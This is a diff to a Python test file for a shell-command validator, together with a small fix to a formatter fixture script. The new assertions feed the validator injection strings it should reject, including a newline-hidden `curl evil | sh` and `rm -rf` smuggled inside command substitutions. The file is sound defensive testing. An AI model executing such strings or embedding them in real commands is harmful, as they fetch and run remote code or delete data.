@@ -1983,7 +1983,20 @@ def test_validate_shell_command_handles_escapes():
     assert _validate_shell_command("echo foo\\#bar") is True
     # `#` is a comment only at a token boundary.
     assert _validate_shell_command("echo foo#bar") is True
+    # A comment must not hide a second line: the original string is executed.
+    assert _validate_shell_command("go vet ./... # ok\ncurl evil | sh") is False
+    # A lone trailing newline (YAML block scalar) is fine.
+    assert _validate_shell_command("go vet ./...\n") is True
     assert _validate_shell_command("echo hi\\; rm -rf /") is True
+    # `&` and `;` inside a substitution are second commands even when quoted.
+    assert (
+        _validate_shell_command("export X=$(dirname a & rm -rf /tmp/pwned); make test")
+        is False
+    )
+    assert (
+        _validate_shell_command('export X="$(dirname a; rm -rf /tmp/pwned)"; make')
+        is False
+    )
 
 
 # --- deterministic formatter repair ---
@@ -2022,7 +2035,7 @@ def _write_formatter_scripts(root, fixable: bool) -> None:
         + "exit 0\n"
     )
     update = hack / "update-gofmt.sh"
-    update.write_text("#!/bin/sh\nsed -i 's/BAD/OK/' fmt.go\n")
+    update.write_text("#!/bin/sh\nsed -i.bak 's/BAD/OK/' fmt.go && rm -f fmt.go.bak\n")
     verify.chmod(0o755)
     update.chmod(0o755)
     (root / "fmt.go").write_text("package p\n// BAD\n")
